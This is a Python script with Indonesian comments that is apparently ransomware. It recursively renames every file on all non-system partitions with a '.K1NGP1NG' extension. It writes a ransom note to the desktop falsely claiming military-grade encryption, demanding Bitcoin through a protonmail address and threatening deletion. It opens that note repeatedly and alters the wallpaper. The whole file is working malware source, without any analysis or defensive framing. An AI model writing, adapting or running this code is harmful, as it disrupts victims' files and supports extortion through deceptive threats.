import os
import ctypes
import psutil, time, subprocess

# Fungsi untuk mengganti ekstensi file menjadi .K1NGP1NG
def change_extension(file_path):
    try:
        # File baru dengan ekstensi .K1NGP1NG
        new_file_path = file_path + '.K1NGP1NG'

        # Ganti nama file menjadi ekstensi baru
        os.rename(file_path, new_file_path)

        return True, f"{file_path} berhasil diubah menjadi {new_file_path}"

    except Exception as e:
        return False, f"Gagal mengganti ekstensi {file_path}: {e}"


# Fungsi untuk mengganti ekstensi file dalam folder
def process_folder(folder_path):
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            success, message = change_extension(file_path)
            print(message)

def note():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop_path, 'K1NGP1NG-N0T3.txt')
    with open(note_path, 'w') as f:
        f.write(f'''The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.''')
        for _ in range(10):
            subprocess.Popen(['notepad.exe', note_path])  # Ganti 'notepad.exe' dengan aplikasi lain jika diperlukan
            time.sleep(2)  # Delay 1 detik antara setiap pembukaan
    return note_path

# Fungsi untuk memproses semua partisi non-sistem
def process_all_partitions():
    # Ambil semua partisi yang terpasang
    partitions = psutil.disk_partitions()

    for partition in partitions:
        # Abaikan partisi sistem atau yang tidak valid
        if 'system' in partition.opts or partition.fstype == '':
            continue

        # Dapatkan path mount partisi
        partition_path = partition.mountpoint
        print(f"Mengganti ekstensi di partisi: {partition_path}")

        # Proses folder di partisi tersebut
        process_folder(partition_path)

def change_desktop_background_color(color):
    color_ref = (color[2] << 16) | (color[1] << 8) | color[0]
    # Menggunakan SystemParametersInfo untuk mengubah wallpaper
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, color_ref, 3)

if __name__ == "__main__":
    # Proses semua partisi non-sistem
    process_all_partitions()

    # Fungsi-fungsi lain yang tidak dipanggil
    # Buat catatan di desktop
    note()

    # Ganti wallpaper desktop
    change_desktop_background_color((0, 0, 255))
